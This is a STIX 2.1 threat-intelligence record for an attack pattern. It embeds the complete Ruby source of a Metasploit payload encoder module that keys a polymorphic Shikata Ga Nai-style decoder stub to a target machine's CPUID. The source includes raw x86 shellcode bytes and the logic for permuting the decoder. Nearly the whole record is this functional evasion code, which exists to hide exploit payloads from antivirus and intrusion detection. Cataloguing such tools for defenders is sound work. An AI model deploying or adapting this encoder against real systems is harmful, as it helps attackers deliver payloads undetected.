{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5be15366-b616-4f51-9d1c-ba78f938a4dc",
    "created": "2024-08-14T16:33:19.214827Z",
    "modified": "2024-08-14T16:33:19.21483Z",
    "name": "CPUID-based Context Keyed Payload Encoder",
    "description": " This is a Context-Keyed Payload Encoder based on CPUID and Shikata Ga Nai. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x86/context_cpuid.rb",
            "external_id": "context_cpuid.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/poly'\n\nclass MetasploitModule < Msf::Encoder::XorAdditiveFeedback\n\n  # Manual ranking because the cpuid value is generated and supplied\n  # manually...\n\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'CPUID-based Context Keyed Payload Encoder',\n      'Description'      => %q{\n        This is a Context-Keyed Payload Encoder based on CPUID and Shikata Ga Nai.\n      },\n      'Author'           => 'Dimitris Glynos',\n      'Arch'             => ARCH_X86,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'    => 4,\n          'BlockSize'  => 4\n        })\n\n    register_options(\n      [\n        OptString.new('CPUID_KEY',\n          [ true,\n          \"CPUID key from target host (see tools/context/cpuid-key utility)\",\n          \"0x00000000\"]),\n      ])\n  end\n\n  def obtain_key(buf, badchars, state)\n    state.key = datastore['CPUID_KEY'].hex\n    return state.key\n  end\n\n  #\n  # Generates the shikata decoder stub.\n  #\n  def decoder_stub(state)\n    # If the decoder stub has not already been generated for this state, do\n    # it now.  The decoder stub method may be called more than once.\n    if (state.decoder_stub == nil)\n      # Shikata will only cut off the last 1-4 bytes of it's own end\n      # depending on the alignment of the original buffer\n      cutoff = 4 - (state.buf.length & 3)\n      block = keygen_stub() + generate_shikata_block(state, state.buf.length + cutoff, cutoff) || (raise BadGenerateError)\n\n      # Take the last 1-4 bytes of shikata and prepend them to the buffer\n      # that is going to be encoded to make it align on a 4-byte boundary.\n      state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf\n\n      # Cache this decoder stub.  The reason we cache the decoder stub is\n      # because we need to ensure that the same stub is returned every time\n      # for a given encoder state.\n      state.decoder_stub = block\n    end\n\n    state.decoder_stub\n  end\n\nprotected\n  def keygen_stub\n    payload =\n      \"\\x31\\xf6\" +     # xor %esi,%esi\n      \"\\x31\\xff\" +     # xor %edi,%edi\n      \"\\x89\\xf8\" +     # cpuid_loop: mov %edi,%eax\n      \"\\x31\\xc9\" +     # xor %ecx,%ecx\n      \"\\x0f\\xa2\" +     # cpuid\n      \"\\x31\\xc6\" +     # xor %eax,%esi\n      \"\\x39\\xf0\" +     # cmp %esi,%eax\n      \"\\x75\\x03\" +     # jne not_first_time\n      \"\\x8d\\x78\\x01\" + # lea 0x1(%eax,1),%edi\n      \"\\x31\\xde\" +     # not_first_time: xor %ebx,%esi\n      \"\\x31\\xce\" +     # xor %ecx,%esi\n      \"\\x31\\xd6\" +     # xor %edx,%esi\n      \"\\x83\\xef\\x01\" + # sub $0x1,%edi\n      \"\\x75\\xe6\" +     # jne cpuid_loop\n      \"\\x89\\xf0\"       # mov %esi,%eax\n  end\n\n  #\n  # Returns the set of FPU instructions that can be used for the FPU block of\n  # the decoder stub.\n  #\n  def fpu_instructions\n    fpus = []\n\n    0xe8.upto(0xee) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xcf) { |x| fpus << \"\\xd9\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xda\" + x.chr }\n    0xc0.upto(0xdf) { |x| fpus << \"\\xdb\" + x.chr }\n    0xc0.upto(0xc7) { |x| fpus << \"\\xdd\" + x.chr }\n\n    fpus << \"\\xd9\\xd0\"\n    fpus << \"\\xd9\\xe1\"\n    fpus << \"\\xd9\\xf6\"\n    fpus << \"\\xd9\\xf7\"\n    fpus << \"\\xd9\\xe5\"\n\n    # This FPU instruction seems to fail consistently on Linux\n    #fpus << \"\\xdb\\xe1\"\n\n    fpus\n  end\n\n  #\n  # Returns a polymorphic decoder stub that is capable of decoding a buffer\n  # of the supplied length and encodes the last cutoff bytes of itself.\n  #\n  def generate_shikata_block(state, length, cutoff)\n    # Declare logical registers\n    key_reg = Rex::Poly::LogicalRegister::X86.new('key', 'eax')\n    count_reg = Rex::Poly::LogicalRegister::X86.new('count', 'ecx')\n    addr_reg  = Rex::Poly::LogicalRegister::X86.new('addr')\n\n    # Declare individual blocks\n    endb = Rex::Poly::SymbolicBlock::End.new\n\n    # FPU blocks\n    fpu = Rex::Poly::LogicalBlock.new('fpu',\n      *fpu_instructions)\n    fnstenv = Rex::Poly::LogicalBlock.new('fnstenv', \"\\xd9\\x74\\x24\\xf4\")\n\n    # Get EIP off the stack\n    popeip = Rex::Poly::LogicalBlock.new('popeip',\n      Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })\n\n    # Clear the counter register\n    clear_register = Rex::Poly::LogicalBlock.new('clear_register',\n      \"\\x31\\xc9\",\n      \"\\x29\\xc9\",\n      \"\\x33\\xc9\",\n      \"\\x2b\\xc9\")\n\n    # Initialize the counter after zeroing it\n    init_counter = Rex::Poly::LogicalBlock.new('init_counter')\n\n    # Divide the length by four but ensure that it aligns on a block size\n    # boundary (4 byte).\n    length += 4 + (4 - (length & 3)) & 3\n    length /= 4\n\n    if (length <= 255)\n      init_counter.add_perm(\"\\xb1\" + [ length ].pack('C'))\n    else\n      init_counter.add_perm(\"\\x66\\xb9\" + [ length ].pack('v'))\n    end\n\n    # Key initialization block\n\n    # Decoder loop block\n    loop_block = Rex::Poly::LogicalBlock.new('loop_block')\n\n    xor  = Proc.new { |b| \"\\x31\" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }\n    xor1 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }\n    xor2 = Proc.new { |b| xor.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }\n    add  = Proc.new { |b| \"\\x03\" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }\n    add1 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - cutoff) ].pack('c') }\n    add2 = Proc.new { |b| add.call(b) + [ (b.offset_of(endb) - b.offset_of(fpu) - 4 - cutoff) ].pack('c') }\n    sub4 = Proc.new { |b| \"\\x83\" + (0xe8 + b.regnum_of(addr_reg)).chr + \"\\xfc\" }\n    add4 = Proc.new { |b| \"\\x83\" + (0xc0 + b.regnum_of(addr_reg)).chr + \"\\x04\" }\n\n    loop_block.add_perm(\n      Proc.new { |b| xor1.call(b) + add1.call(b) + sub4.call(b) },\n      Proc.new { |b| xor1.call(b) + sub4.call(b) + add2.call(b) },\n      Proc.new { |b| sub4.call(b) + xor2.call(b) + add2.call(b) },\n      Proc.new { |b| xor1.call(b) + add1.call(b) + add4.call(b) },\n      Proc.new { |b| xor1.call(b) + add4.call(b) + add2.call(b) },\n      Proc.new { |b| add4.call(b) + xor2.call(b) + add2.call(b) })\n\n    # Loop instruction block\n    loop_inst = Rex::Poly::LogicalBlock.new('loop_inst',\n      \"\\xe2\\xf5\")\n\n    # Define block dependencies\n    fnstenv.depends_on(fpu)\n    popeip.depends_on(fnstenv)\n    init_counter.depends_on(clear_register)\n    loop_block.depends_on(popeip, init_counter)\n    loop_inst.depends_on(loop_block)\n\n    # Generate a permutation saving the EAX, ECX and ESP registers\n    loop_inst.generate([\n      Rex::Arch::X86::EAX,\n      Rex::Arch::X86::ESP,\n      Rex::Arch::X86::ECX ], nil, state.badchars)\n  end\nend\n"
}